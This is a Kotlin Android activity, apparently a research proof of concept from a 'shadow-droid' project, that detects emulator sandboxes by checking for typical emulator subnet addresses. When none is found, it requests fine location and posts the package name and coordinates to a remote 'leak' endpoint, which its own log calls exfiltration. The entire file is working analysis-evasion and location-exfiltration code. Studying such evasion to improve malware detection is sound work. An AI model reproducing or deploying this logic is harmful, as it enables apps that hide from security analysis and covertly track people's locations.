package nl.tbethe.shadowdroid.subnet

import android.Manifest
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.location.Criteria
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.Network
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresPermission
import io.ktor.client.*
import io.ktor.client.engine.cio.*
import io.ktor.client.request.forms.*
import io.ktor.client.statement.*
import io.ktor.http.*
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

private const val TAG = "MainActivity"

class MainActivity : AppCompatActivity() {

    @SuppressLint("MissingPermission")
    val requestPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) sendLocation()
        }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val connManager = getSystemService(ConnectivityManager::class.java)
        val networks: Array<Network> = connManager.allNetworks
        val r = networks
                .map { network -> connManager.getLinkProperties(network) }
                .mapNotNull { linkProps -> linkProps?.linkAddresses }
                .map { listOfLinkAddresses ->
                    listOfLinkAddresses.map { it.address.hostAddress }
                }
                .flatten()
        val isEmu = r.map {
            it.contains("192.168.232.") || it.contains("10.0.2.")
        }.any { it }

        leakLocationIf(!isEmu)
    }

    private fun leakLocationIf(notAnalyser: Boolean) {
        if (!notAnalyser) return

        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            PackageManager.PERMISSION_DENIED -> {
                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
            }
            PackageManager.PERMISSION_GRANTED -> {
                sendLocation()
            }
        }
    }

    @RequiresPermission("android.permission.ACCESS_FINE_LOCATION")
    @SuppressLint("MissingPermission")
    private fun sendLocation() {
        val locationManager = getSystemService(LocationManager::class.java)
        val provider : String? = locationManager.getBestProvider(Criteria(), true)
        provider?.let {
            locationManager.requestSingleUpdate(provider, { loc ->
                val url = "https://vm-thijs.ewi.utwente.nl/shadow-droid/leak"
                CoroutineScope(Dispatchers.IO).launch {
                    try {
                        HttpClient(CIO).use { client ->
                            val response = client.submitForm<HttpResponse>(
                                url,
                                Parameters.build {
                                    append("appname", packageName)
                                    append("latitude", "${loc.latitude}")
                                    append("longitude", "${loc.longitude}")
                                },
                                false
                            )
                            Log.d(TAG, "Response status: ${response.status}")
                            Log.d(TAG, "Response: ${response.readText()}")
                        }
                    } catch (e: Exception) {
                        Log.d(TAG, "IO Exception occurred when trying to exfiltrate data")
                    }
                }
            }, null)
        }
    }
}
